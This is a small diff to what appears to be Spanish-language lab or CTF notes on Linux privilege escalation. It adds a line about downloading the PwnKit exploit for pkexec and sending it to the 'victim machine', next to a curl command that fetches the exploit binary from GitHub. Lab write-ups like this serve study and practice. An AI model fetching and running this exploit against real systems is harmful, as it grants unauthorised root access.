@@ -299,8 +299,10 @@ buscando binarios hemos conseguido el binario `pkexec` con la experiencia que ya
 ![[Pasted image 20240713184937.png]]
 
 ### pwnkit
+vamos a descargar el pwnkit en nuestra maquina para luego enviarlo a la maquina victima
 
 ```python
 curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
 ```
 
+![[Pasted image 20240713185446.png]]
